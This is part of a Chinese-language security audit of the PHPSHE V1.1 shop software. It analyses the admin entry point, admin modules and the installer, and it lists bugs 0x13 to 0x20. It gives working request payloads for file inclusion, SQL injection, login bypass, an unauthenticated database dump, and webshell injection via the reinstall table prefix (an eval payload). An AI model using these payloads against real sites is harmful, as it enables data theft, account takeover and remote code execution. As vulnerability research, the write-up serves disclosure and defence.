## **PHPSHE V1.1 （四）**
### **後臺入口 admin.php**
和前臺一樣，該文件首先包含common.php文件。
<p>
	
然後是定義後臺導航菜單的陣列 `$adminmenu`,接著就是判斷管理員權限，以及包含後臺操作類模塊。

```php
if (!pe_login('admin') && $act != 'login') 
{
    pe_goto('admin.php?mod=do&act=login');
}
if (pe_login('admin') && ($act == 'login' or $mod == 'index')) 
{
    pe_goto('admin.php?mod=order&act=list');
}
```
此處利用兩個`if`條件判斷登陸和未登入的兩種情況。
<p>

`漏洞出現`這裡用`&&`兩個條件。都達成的時候才會進入`pe_goto。`
<p>

在未登入的時候，只要`$act`為`login`的時候就不會進入`pe_goto`。

在登陸之後，只要`$act`不為`login`並且`$mod`不為`login`的時候也不會進入`pe_goto。`

再看後面，直接就包含了`$module`和`$mod`

```php
include("{$pe['path_root']}module/{$module}/{$mod}.php");
```

### **【Bug 0x13: 任意文件包含漏洞 有限制條件】（同 【Bug 0x01】）**

```/admin.php?mod=../../robots.txt%00&act=login```

後臺模塊
接下來，我們在跟進分析`/module/admin/`裏面的後臺模塊：
- ad.php
- admin.php
- article.php
- ask.php
- cache.php
- category.php
- class.php
- comment.php
- db.php
- do.php
- link.php
- order.php
- page.php
- payway.php
- product.php
- setting.php
- user.php

由於有`act=login`後臺操作我們就不能執行act等操作了。
<p>

直接看`switch ($act) {的default :`塊。
<p>

### **admin.php**
<p>
直接就可以看到管理員用戶名

### **【Bug 0x14: 信息洩漏】**
```/admin.php?mod=admin&act=login```

### **ask.php**

```php
default :
    $sqlwhere = " and `ask_state` = '".intval($_g_state)."'";
    $_g_name && $sqlwhere .= " and b.`product_name` like '%{$_g_name}%'";
    $_g_text && $sqlwhere .= " and a.`ask_text` like '%{$_g_text}%'";
    $_g_user_name && $sqlwhere .= " and a.`user_name` like '%{$_g_user_name}%'";
    $sql = "select * from `".dbpre."ask` a,`".dbpre."product` b where a.`product_id` = b.`product_id` {$sqlwhere} order by a.`ask_id` desc";
    $info_list = $db->sql_selectall($sql, array(20, $_g_page));
```
看到了麼，限制了act也是有機可乘的。有一個注入存在。

### **【Bug 0x15: SQL注入 獲取任意資料庫資料】**

<pre>/admin.php?mod=ask&act=login&name=%' or 1=1%23</pre>

**comment.php & order.php & product.php & user.php**

### **【Bug 0x16: SQL注入 獲取任意資料庫資料】（同 【Bug 0x15】）**

### **db.php**
大致瀏覽、發現這是一個資料庫備份導入模塊，並且與其他模塊不同，沒有用到`switch`。
<p>

只判斷了`$act == 'import'`導入功能，對於備份並沒有用act判斷。

```php
if (isset($_p_pebackup)) 
{//備份資料庫
    $pe_cutsql = "/*#####################@ pe_cutsql @#####################*/\n";
    if (isset($_p_pebackup)) 
    {//不分卷
        if ($_p_backup_cut && $_p_backup_where == 'down') 
            pe_error('只有在備份在伺服器才可以使用分卷功能...');
        if ($_p_backup_cut && !$_p_backup_cutsize) 
            pe_error('使用分卷備份必須填寫分卷文件大小...');
        if ($_p_backup_where == "server") 
        {
            !is_dir($back_path) && mkdir($back_path, 0777, true);
            !is_writable($back_path) && pe_error("{$back_path} 目錄沒有寫入權限...");
        }
        if (!$_p_backup_cut) 
        {
            $sql_arr = array();
            foreach ($table_list as $v) 
            {
                $sql_arr = array_merge($sql_arr, dosql($v['Name']));
            }
            $sql = implode($pe_cutsql, $sql_arr);
            if ($_p_backup_where == 'down') 
            {
                down_file($sql, "db_all.sql");
            }
            elseif ($_p_backup_where == 'server') 
            {
                if (file_put_contents("{$back_path}db_all.sql", $sql)) 
                {
                    pe_success("資料庫備份完成！");
                }
                else {
                    pe_error("資料庫備份失敗...");
                }
            }
        }
        else 
        {
            $vnum = 1;
            $sql_arr = array();
            foreach ($table_list as $v) 
            {
                $sql_arr = array_merge($sql_arr, dosql($v['Name']));
                $sql = implode($pe_cutsql, $sql_arr);
                if (strlen($sql) >= $_p_backup_cutsize * 1000) 
                {
                    file_put_contents("{$back_path}db_v{$vnum}.sql", $sql);
                    $sql_arr = array();
                    $vnum++;
                }
            }
            $sql && file_put_contents("{$back_path}db_v{$vnum}.sql", $sql);
            pe_success("資料分卷備份完成！");
        }
    }
}
```
因此，我們可以直接備份資料庫，下載襲來。

```php
if ($_p_backup_where == 'down') 
{
    down_file($sql, "db_all.sql");
}
```

### **【Bug 0x17: 完全資料庫信息洩漏】**
POST:
<p>
<pre>/admin.php?mod=db&act=login</pre>
DATA:
<p>
<pre>backup_cut=0&backup_where=down&pebackup=1</pre>


### **do.php**

```php
default:
    if (isset($_p_pesubmit)) 
    {
        $_p_info['admin_pw'] = md5($_p_info['admin_pw']);
        if ($info = $db->pe_select('admin', pe_dbhold($_p_info))) 
        {
            $db->pe_update('admin', array('admin_id'=>$info['admin_id']), array('admin_ltime'=>time()));
```

### **【Bug 0x18: SQL注入 任意用戶登陸】（同【Bug 0x09】）**
<pre>
/admin.php?mod=do&act=login

info[admin_name`<>1-- -]=admin&info[admin_pw]=admin&pesubmit=+
</pre>

一般來說，到這裡基本上就要結束了。
<p>
目前，並沒有找到什麼可以getshell的漏洞。
<p>
不要放棄，還有個地方我們沒看。
<p>
就是install目錄。
<p>

### **isntall.php**
看了下，這個文件利用沒有lock限制。
<p>
這樣可以導致重裝覆蓋，產生一個不小的漏洞。

```php
switch ($_g_step) {
    //#####################@ 配置信息 @#####################//
    case 'setting':
        if (isset($_p_pesubmit)) 
        {
            $dbconn = mysql_connect("{$_p_db_host}:{$_p_db_port}", $_p_db_user, $_p_db_pw);
            if (!$dbconn) pe_error('資料庫連接失敗...資料庫ip，用戶名，密碼對嗎？ ');
            if (!mysql_select_db($_p_db_name, $dbconn)) 
            {
                mysql_query("CREATE DATABASE `{$_p_db_name}` DEFAULT CHARACTER SET utf8", $dbconn);
                !mysql_select_db($_p_db_name, $dbconn) && pe_error('資料庫選擇失敗...資料庫名對嗎？');
            }
            mysql_query("SET NAMES utf8", $dbconn);
            mysql_query("SET sql_mode = ''", $dbconn);

            $sql_arr = explode('/*#####################@ pe_cutsql @#####################*/', file_get_contents("{$pe['path_root']}install/phpshe.sql"));
            foreach ($sql_arr as $v) 
            {
                $result = mysql_query(trim(str_ireplace('{dbpre}', $_p_dbpre, $v)));
            }
            if ($result) 
            {
                mysql_query("update `{$_p_dbpre}admin` set `admin_name` = '{$_p_admin_name}', `admin_pw` = '".md5($_p_admin_pw)."' where `admin_id`=1", $dbconn);
               	 $config = $pe['db_host'] = '{$_p_db_host}' //資料庫主機地址
			                $pe['db_name'] = '{$_p_db_name}'; //資料庫名稱
			                $pe['db_user'] = '{$_p_db_user}'; //資料庫用戶名
			                $pe['db_pw'] = '{$_p_db_pw}'; //資料庫密碼
			                $pe['db_coding'] = 'utf8';\n\
			                $pe['url_model'] = 'pathinfo'; //url模式,可選項(pathinfo/pathinfo_safe/php)
			                define('dbpre','{$_p_dbpre}'); //資料庫表前綴
                
                file_put_contents("{$pe['path_root']}config.php", $config);
                pe_goto("{$pe['host_root']}install/index.php?step=success");
            }
```

安裝的時候，傳輸的資料並沒有經過過濾。
<p>
導致可以直接寫webshell到config.php文件。
<p>
因為在寫配置之前，需要連接資料庫，我們能夠自由控制的變量只剩下表前綴{$_p_dbpre}了。
<p>

### **【Bug 0x19: 任意代碼執行】**
<pre>
/install/install.php?step=setting

pesubmit=1&dbpre=');eval($_POST[1]);//&.....
</pre>

最後在總結一下我們所挖掘到的漏洞。
<p>

`index.php`和`admin.php`都能夠進行包含，我們是不是可以利用index.php包含admin的模塊？
<p>
答案是肯定的。這樣就成功繞過了`act=login`的限制了。
<p>
雖然會顯示模板錯誤，但是加載模板之前的代碼確確實實的執行了。

### **【Bug 0x20: 越權】**
<pre>/index.php?mod=../admin/setting（模塊）</pre>